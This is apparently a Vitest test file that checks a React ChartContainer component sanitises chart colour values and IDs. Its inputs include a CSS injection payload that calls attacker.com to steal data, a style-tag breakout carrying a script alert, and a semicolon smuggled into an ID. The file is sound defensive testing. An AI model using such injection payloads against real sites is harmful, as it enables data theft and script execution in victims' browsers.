import React from "react";
import { render } from "@testing-library/react";
import { ChartContainer, ChartConfig } from "./chart";
import { describe, it, expect, vi } from "vitest";

// Mock ResizeObserver
global.ResizeObserver = vi.fn().mockImplementation(() => ({
  observe: vi.fn(),
  unobserve: vi.fn(),
  disconnect: vi.fn(),
}));

describe("Chart Component Security", () => {
  it("should not be vulnerable to CSS injection", () => {
    const maliciousConfig: ChartConfig = {
      test: {
        label: "Test",
        color: "red; background-image: url('http://attacker.com/steal?data=xxx');",
      },
    };

    const { container } = render(
      <ChartContainer config={maliciousConfig}>
        <div>Chart Content</div>
      </ChartContainer>
    );

    // Find the style tag
    const styleTag = container.querySelector("style");
    expect(styleTag).not.toBeNull();

    // The semicolon should be removed, preventing the start of a new property
    // The value becomes "red background-image..." which is assigned to the variable
    // but not interpreted as a new property.
    // We check that we DO NOT have "; background-image:" structure
    expect(styleTag?.innerHTML).not.toContain("; background-image:");

    // The content might still contain the text, but sanitized
    expect(styleTag?.innerHTML).toContain("red background-image");
  });

  it("should support valid CSS colors", () => {
    const validConfig: ChartConfig = {
      test: {
        label: "Test",
        color: "hsl(208, 64%, 78%)",
      },
    };
    const { container } = render(
      <ChartContainer config={validConfig}>
        <div>Chart Content</div>
      </ChartContainer>
    );
    const styleTag = container.querySelector("style");
    expect(styleTag?.innerHTML).toContain("--color-test: hsl(208, 64%, 78%);");
  });

  it("should sanitize chart ID", () => {
    const config: ChartConfig = {
      test: {
        label: "Test",
        color: "red",
      },
    };
    const { container } = render(
      <ChartContainer id="test_chart;hack" config={config}>
        <div>Chart Content</div>
      </ChartContainer>
    );

    // The id passed is "test_chart;hack".
    // Sanitized id should be "chart-test_charthack" (since ; is removed, _ is allowed)

    // Check if the style tag uses the sanitized id
    const styleTag = container.querySelector("style");
    expect(styleTag?.innerHTML).toContain("[data-chart=chart-test_charthack]");

    // Check the div attribute
    // ChartContainer renders a div with data-chart={chartId}
    const chartDiv = container.querySelector("[data-chart='chart-test_charthack']");
    expect(chartDiv).not.toBeNull();
  });

  it("should prevent XSS via style tag breakout", () => {
    const maliciousConfig: ChartConfig = {
      test: {
        label: "Test",
        color: "red</style><script>alert('XSS')</script>",
      },
    };

    const { container } = render(
      <ChartContainer config={maliciousConfig}>
        <div>Chart Content</div>
      </ChartContainer>
    );

    const styleTag = container.querySelector("style");
    // Check that </style> is not present inside the style tag content
    // Because < and > are stripped
    expect(styleTag?.innerHTML).not.toContain("</style>");
    expect(styleTag?.innerHTML).not.toContain("<script>");
    // Should contain stripped version
    expect(styleTag?.innerHTML).toContain("red/stylescriptalert('XSS')/script");
  });
});
